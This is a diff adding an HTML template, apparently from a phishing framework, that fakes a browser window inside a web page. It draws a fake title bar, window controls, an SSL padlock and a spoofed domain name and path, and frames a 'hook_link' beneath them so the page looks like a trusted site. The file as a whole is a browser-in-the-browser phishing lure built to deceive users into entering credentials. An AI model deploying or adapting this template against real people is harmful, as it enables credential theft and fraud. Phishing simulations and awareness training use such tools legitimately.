@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="{{ url_for('static', filename='phishing/') }}{{ template_static_dir }}/style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="{{ url_for('static', filename='phishing/') }}{{ template_static_dir }}/logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">{{ phishing_title }}</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="{{ url_for('static', filename='phishing/') }}{{ template_static_dir }}/ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">{{ domain_name }}</span>
+		<span id="domain-path">{{ domain_path }}</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="{{ hook_link }}" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="{{ url_for('static', filename='common/js/script.js') }}"></script>
+<script src="{{ url_for('static', filename='phishing/') }}{{ template_static_dir }}/script.js"></script>
+</html>
+
